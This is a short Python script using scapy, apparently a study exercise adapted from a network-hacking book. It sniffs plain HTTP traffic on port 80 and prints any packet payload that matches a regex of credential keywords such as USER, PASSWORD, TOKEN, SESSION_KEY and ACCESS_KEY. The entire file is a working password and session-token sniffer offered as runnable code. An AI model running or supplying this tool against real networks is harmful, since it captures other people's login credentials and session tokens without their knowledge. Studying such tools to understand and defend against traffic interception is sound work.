from scapy.all import *
import re

#Adaptacao: Understanding Network Hacks, pag.52
pattern = re.compile(r"""(?P<found>(USER|USERNAME|PASS|
PASSWORD|LOGIN|BENUTZER|PASSWORD|AUTH|
ACCESS|ACCESS_?KEY|SESSION|
SESSION_?KEY|TOKEN)[=:\s].+)\b""",
re.MULTILINE|re.IGNORECASE) #1

def packet_callback(packet):
    if packet[TCP].payload:
        payload = "\n".join(packet.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
        match = re.search(pattern, payload) #2
        if match: #3
            print "*" * 70
            print payload #4

sniff(filter="tcp port 80",prn=packet_callback,store=0)